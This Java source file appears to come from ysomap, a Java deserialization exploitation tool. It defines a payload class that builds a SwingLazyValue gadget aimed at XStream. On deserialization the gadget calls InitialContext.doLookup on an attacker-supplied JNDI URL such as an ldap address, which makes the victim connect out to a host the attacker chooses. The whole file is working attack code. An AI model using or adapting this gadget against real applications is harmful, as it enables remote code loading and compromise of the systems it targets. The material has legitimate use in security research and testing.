package ysomap.bullets.jdk;

import sun.swing.SwingLazyValue;
import ysomap.bullets.Bullet;
import ysomap.common.annotation.*;

/**
 * @author wh1t3P1g
 * @since 2021/1/4
 */
@Bullets
@Dependencies({"jdk"})
@Details("向外部发起JNDI连接")
@Targets({Targets.XSTREAM})
@Authors({Authors.WH1T3P1G})
public class SwingLazyValueBullet implements Bullet<SwingLazyValue> {

    @NotNull
    @Require(name = "jndiURL", detail = "like ldap://xxx/xx")
    public String jndiURL;


    @Override
    public SwingLazyValue getObject() throws Exception {
        String classname = "javax.naming.InitialContext";
        String methodName = "doLookup";
        Object[] evilargs = new Object[]{jndiURL};
        return new SwingLazyValue(classname, methodName, evilargs);
    }
}
